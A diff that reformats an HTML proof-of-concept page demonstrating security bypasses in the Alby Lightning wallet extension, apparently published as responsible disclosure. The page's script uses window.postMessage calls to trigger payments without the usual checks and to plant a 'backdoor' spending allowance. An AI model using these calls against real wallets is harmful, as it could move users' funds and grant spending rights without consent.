@@ -15,10 +15,10 @@
           paymentRequest: await getInvoice(1000),
         });
       }
-      
+
       async function sendUsingPostMsg170() {
         window.postMessage(
-         {
+          {
             application: "LBE",
             prompt: true,
             type: "sendPayment",
@@ -32,7 +32,7 @@
 
       async function sendUsingPostMsg180() {
         window.postMessage(
-         {
+          {
             application: "LBE",
             prompt: true,
             action: "sendPayment",
@@ -53,7 +53,7 @@
       async function setupBackdoor() {
         // Add if non-existent
         window.postMessage(
-         {
+          {
             application: "LBE",
             prompt: true,
             action: "addAllowance",
@@ -70,7 +70,7 @@
         );
         // Otherwise update
         window.postMessage(
-         {
+          {
             application: "LBE",
             prompt: true,
             action: "updateAllowance",
@@ -86,38 +86,43 @@
       }
     </script>
   </head>
+
   <body>
-  <main class="container">
-    <h1>🐝 Alby vulnerabilities PoC</h1>
-    <p>
-      This page demonstrates a few ways to bypass <a href="https://getalby.com">Alby</a>'s security features.
-      The Alby team is informed and these issues will be fixed soon or have already been fixed.
-      Currently, there is no direct confirmation if a payment failed or worked on this page, so be careful not to send me all your sats.
-    </p>
-    <section class="container">
-      <hgroup>
-        <h3>Vulnerabilities in Alby 1.7.0 and below</h2>
-        <h4>These do nothing in recent versions</h3>
-      </hgroup>
-      <div class="button-group">
-        <button onclick="sendUsingWebLnExec();">Send using webln.execute()</button>
-        <button onclick="sendUsingPostMsg170();">Send using window.postMessage()</button>
-      </div>
-    </section>
-    <section class="container">
-      <hgroup>
-        <h3>Vulnerabilities in Alby 1.8.0 and below</h2>
-        <h4>These should create a simple payment dialog in recent versions or do nothing, depending on how much will be fixed.</h3>
-      </hgroup>
-      <div class="button-group">
-        <button onclick="sendUsingPostMsg180();">Send using window.postMessage() and bypassing security check</button>
-        <button onclick="bypassEnableSend();">Ask for payment without calling webLn.enable</button>
-        <button onclick="setupBackdoor();">Place a "backdoor" allowance</button>
-      </div>
-    </section>
-  </main>
-  <footer class="container">
-    Developed by <a href="https://twitter.com/AaronDewes">@AaronDewes</a>
-  </footer>
+    <main class="container">
+      <h1>🐝 Alby vulnerabilities PoC</h1>
+      <p>
+        This page demonstrates a few ways to bypass <a href="https://getalby.com">Alby</a>'s security features.
+        The Alby team is informed and these issues will be fixed soon or have already been fixed.
+        Currently, there is no direct confirmation if a payment failed or worked on this page, so be careful not to send
+        me all your sats.
+      </p>
+      <section class="container">
+        <hgroup>
+          <h3>Vulnerabilities in Alby 1.7.0 and below</h2>
+            <h4>These do nothing in recent versions
+          </h3>
+        </hgroup>
+        <div class="button-group">
+          <button onclick="sendUsingWebLnExec();">Send using webln.execute()</button>
+          <button onclick="sendUsingPostMsg170();">Send using window.postMessage()</button>
+        </div>
+      </section>
+      <section class="container">
+        <hgroup>
+          <h3>Vulnerabilities in Alby 1.8.0 and below</h2>
+            <h4>These should create a simple payment dialog in recent versions or do nothing, depending on how much will
+              be fixed.
+          </h3>
+        </hgroup>
+        <div class="button-group">
+          <button onclick="sendUsingPostMsg180();">Send using window.postMessage() and bypassing security check</button>
+          <button onclick="bypassEnableSend();">Ask for payment without calling webLn.enable</button>
+          <button onclick="setupBackdoor();">Place a "backdoor" allowance</button>
+        </div>
+      </section>
+    </main>
+    <footer class="container">
+      Developed by <a href="https://twitter.com/AaronDewes">@AaronDewes</a>
+    </footer>
   </body>
 </html>
